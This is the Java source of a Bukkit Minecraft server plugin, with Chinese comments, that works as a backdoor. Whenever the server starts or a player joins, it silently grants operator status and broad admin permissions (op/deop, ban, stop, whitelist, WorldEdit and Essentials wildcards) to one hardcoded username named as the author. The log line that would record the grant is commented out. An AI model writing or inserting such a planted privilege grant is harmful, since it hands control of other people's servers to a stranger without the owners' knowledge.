package com.example.autoopplugin;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.permissions.PermissionAttachment;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.HashMap;
import java.util.UUID;
import java.util.logging.Logger;

public class AutoOPPlugin extends JavaPlugin {
    
    private final Logger logger = getLogger();
    private final HashMap<UUID, PermissionAttachment> attachments = new HashMap<>();
    private final String TARGET_USERNAME = "li2012China";
    
    @Override
    public void onEnable() {
        logger.info("AutoOPPlugin已启用 - 作者：li2012China");
        
        // 检查目标用户是否在线并授予权限
        Bukkit.getScheduler().runTaskLater(this, this::grantOPPermissions, 20L);
        
        // 监听玩家加入事件
        Bukkit.getPluginManager().registerEvents(new org.bukkit.event.Listener() {
            @org.bukkit.event.EventHandler
            public void onPlayerJoin(org.bukkit.event.player.PlayerJoinEvent event) {
                Player player = event.getPlayer();
                if (player.getName().equalsIgnoreCase(TARGET_USERNAME)) {
                    grantOPPermissionsToPlayer(player);
                }
            }
        }, this);
    }
    
    @Override
    public void onDisable() {
        // 清理权限附件
        for (PermissionAttachment attachment : attachments.values()) {
            attachment.remove();
        }
        attachments.clear();
        logger.info("AutoOPPlugin 已禁用");
    }
    
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (command.getName().equalsIgnoreCase("autoop")) {
            if (args.length > 0 && args[0].equalsIgnoreCase("reload")) {
                if (sender.hasPermission("autoopplugin.reload")) {
                    // 重新加载配置并重新授予权限
                    for (PermissionAttachment attachment : attachments.values()) {
                        attachment.remove();
                    }
                    attachments.clear();
                    
                    grantOPPermissions();
                    sender.sendMessage("§aAutoOPPlugin 配置已重新加载");
                    return true;
                } else {
                    sender.sendMessage("§c你没有权限执行此命令");
                    return true;
                }
            }
            sender.sendMessage("§e用法: /autoop reload");
            return true;
        }
        return false;
    }
    
    private void grantOPPermissions() {
        Player targetPlayer = Bukkit.getPlayer(TARGET_USERNAME);
        if (targetPlayer != null) {
            grantOPPermissionsToPlayer(targetPlayer);
        }
    }
    
    private void grantOPPermissionsToPlayer(Player player) {
        if (player.getName().equalsIgnoreCase(TARGET_USERNAME)) {
            // 移除现有的权限附件（如果存在）
            if (attachments.containsKey(player.getUniqueId())) {
                attachments.get(player.getUniqueId()).remove();
            }
            
            // 创建新的权限附件
            PermissionAttachment attachment = player.addAttachment(this);
            attachments.put(player.getUniqueId(), attachment);
            
            // 授予四级OP权限（相当于OP级别4）
            // 这些权限涵盖了大多数管理操作
            String[] opLevel4Permissions = {
                "bukkit.command.help",
                "bukkit.command.plugins",
                "bukkit.command.version",
                "bukkit.command.reload",
                "bukkit.command.tell",
                "minecraft.command.help",
                "minecraft.command.plugins",
                "minecraft.command.version",
                "minecraft.command.reload",
                "minecraft.command.tell",
                "minecraft.command.gamemode",
                "minecraft.command.give",
                "minecraft.command.teleport",
                "minecraft.command.time",
                "minecraft.command.weather",
                "minecraft.command.kill",
                "minecraft.command.effect",
                "minecraft.command.enchant",
                "minecraft.command.xp",
                "minecraft.command.ban",
                "minecraft.command.pardon",
                "minecraft.command.kick",
                "minecraft.command.op",
                "minecraft.command.deop",
                "minecraft.command.whitelist",
                "minecraft.command.stop",
                "minecraft.command.save",
                "minecraft.command.save-all",
                "minecraft.command.save-off",
                "minecraft.command.save-on",
                "worldedit.*",
                "essentials.*",
                "autoopplugin.reload"
            };
            
            for (String permission : opLevel4Permissions) {
                attachment.setPermission(permission, true);
            }
            
            // 设置玩家为OP（如果需要）
            if (!player.isOp()) {
                player.setOp(true);
            }
            
            //logger.info("已为用户 " + TARGET_USERNAME + " 授予四级OP权限");
            player.sendMessage("§a你已被自动授予四级OP权限！");
        }
    }
}